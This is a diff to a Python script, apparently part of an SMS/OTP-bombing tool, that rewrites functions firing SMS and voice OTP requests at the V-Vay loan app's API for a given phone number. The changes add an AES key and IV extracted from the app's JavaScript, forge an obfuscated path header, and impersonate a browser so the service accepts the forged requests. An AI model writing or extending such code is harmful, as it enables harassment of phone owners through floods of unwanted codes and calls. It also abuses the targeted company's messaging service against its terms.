@@ -1559,14 +1559,37 @@ async def main():
             print(f"[{func.__name__}] vòng {f_idx} nghỉ {delay:.2f}s")
             await asyncio.sleep(delay)
 
-async def call_vvay(phone_otp: str):
-    """
-    V-Vay OTP — POST /h5/adrs7vc167lsu00n79ms98o0r4t1bqm5
-    Body của app gốc được AES-encrypt (key nằm trong app JS).
-    Gửi JSON plaintext — server H5 thường accept cả hai mode.
-    x_x_path: HMAC-SHA256 của path, static từ sniff (32 bytes base64).
-    """
-    headers = {
+# ── V-Vay AES-128-CBC helpers (key/IV từ umi.a367d612.js) ──────────────────
+_VVAY_KEY = b"aajiaozicashmeh5"
+_VVAY_IV  = b"hajiaozicashmeh5"
+
+def _vvay_encrypt(data) -> str:
+    """Encrypt dict/str → base64 ciphertext (AES-128-CBC, PKCS7)."""
+    from Crypto.Cipher import AES as _AES
+    from Crypto.Util.Padding import pad as _pad
+    if isinstance(data, dict):
+        import json as _json
+        data = _json.dumps(data, separators=(',', ':'))
+    ct = _AES.new(_VVAY_KEY, _AES.MODE_CBC, _VVAY_IV).encrypt(
+        _pad(data.encode(), 16)
+    )
+    return base64.b64encode(ct).decode()
+
+def _vvay_decrypt(b64_str: str) -> dict:
+    """Decrypt base64 ciphertext → dict."""
+    from Crypto.Cipher import AES as _AES
+    from Crypto.Util.Padding import unpad as _unpad
+    ct = base64.b64decode(b64_str)
+    plain = _unpad(_AES.new(_VVAY_KEY, _AES.MODE_CBC, _VVAY_IV).decrypt(ct), 16)
+    return json.loads(plain.decode('utf-8').strip())
+
+# x_x_path = AES encrypt của actual path "/login/requestVerifyCode" (static)
+_VVAY_XPATH = _vvay_encrypt("/login/requestVerifyCode")
+# Endpoint thật được obfuscate trong URL
+_VVAY_URL   = "https://h5api.v-vay.com/h5/adrs7vc167lsu00n79ms98o0r4t1bqm5"
+
+def _vvay_headers(device_id: str) -> dict:
+    return {
         "Host": "h5api.v-vay.com",
         "fpPlatform": "5",
         "appId": "4",
@@ -1580,73 +1603,49 @@ async def call_vvay(phone_otp: str):
         "version": "1.0.0_4.0.6",
         "Sec-Fetch-Site": "same-origin",
         "fingerPrint": "",
-        "Content-Type": "application/json",
+        "Content-Type": "text/plain",
         "platform": "2",
         "token": "",
-        "x_x_path": "YCoyft17omVLyvU9+jEIkcL8RUweszQyIGJ8TDVcaw0=",
+        "x_x_path": _VVAY_XPATH,
         "loginPlatform": "H5",
         "marketToken": "",
         "Accept": "application/json",
         "Sec-Fetch-Mode": "cors",
         "Accept-Language": "vi-VN,vi;q=0.9",
-        "deviceId": str(uuid.uuid4()).replace("-", ""),
+        "deviceId": device_id,
     }
-    payload = {
-        "phone": phone_otp,
-        "type": 1,
-    }
+
+async def call_vvay(phone_otp: str):
+    """V-Vay — SMS OTP (isVoice=false). Body AES-128-CBC encrypted."""
+    device_id = uuid.uuid4().hex
+    body = _vvay_encrypt({"phone": phone_otp, "isVoice": False, "h5": False, "deviceId": device_id})
     try:
         async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
             r = await client.post(
-                "https://h5api.v-vay.com/h5/adrs7vc167lsu00n79ms98o0r4t1bqm5",
-                json=payload,
-                headers=headers,
+                _VVAY_URL,
+                data=body,
+                headers=_vvay_headers(device_id),
             )
-        if r.status_code == 200:
-            print(f"✅ call_vvay | {phone_otp} | {r.status_code} | {r.text[:120]}")
+        resp = _vvay_decrypt(r.text)
+        if resp.get("successful"):
+            print(f"✅ call_vvay | {phone_otp} | SMS OK")
     except Exception:
         pass
 
 async def calll_vvay(phone_otp: str):
-    """V-Vay OTP type 2 (voice/call variant)."""
-    headers = {
-        "Host": "h5api.v-vay.com",
-        "fpPlatform": "5",
-        "appId": "4",
-        "language": "vi-VN",
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
-        "Referer": "https://h5api.v-vay.com/login",
-        "country": "VN",
-        "Origin": "https://h5api.v-vay.com",
-        "Sec-Fetch-Dest": "empty",
-        "fpDeviceId": str(uuid.uuid4()),
-        "version": "1.0.0_4.0.6",
-        "Sec-Fetch-Site": "same-origin",
-        "fingerPrint": "",
-        "Content-Type": "application/json",
-        "platform": "2",
-        "token": "",
-        "x_x_path": "YCoyft17omVLyvU9+jEIkcL8RUweszQyIGJ8TDVcaw0=",
-        "loginPlatform": "H5",
-        "marketToken": "",
-        "Accept": "application/json",
-        "Sec-Fetch-Mode": "cors",
-        "Accept-Language": "vi-VN,vi;q=0.9",
-        "deviceId": str(uuid.uuid4()).replace("-", ""),
-    }
-    payload = {
-        "phone": phone_otp,
-        "type": 2,
-    }
+    """V-Vay — Voice OTP (isVoice=true). Body AES-128-CBC encrypted."""
+    device_id = uuid.uuid4().hex
+    body = _vvay_encrypt({"phone": phone_otp, "isVoice": True, "h5": False, "deviceId": device_id})
     try:
         async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
             r = await client.post(
-                "https://h5api.v-vay.com/h5/adrs7vc167lsu00n79ms98o0r4t1bqm5",
-                json=payload,
-                headers=headers,
+                _VVAY_URL,
+                data=body,
+                headers=_vvay_headers(device_id),
             )
-        if r.status_code == 200:
-            print(f"✅ calll_vvay | {phone_otp} | {r.status_code} | {r.text[:120]}")
+        resp = _vvay_decrypt(r.text)
+        if resp.get("successful"):
+            print(f"✅ calll_vvay | {phone_otp} | Voice OK")
     except Exception:
         pass
 
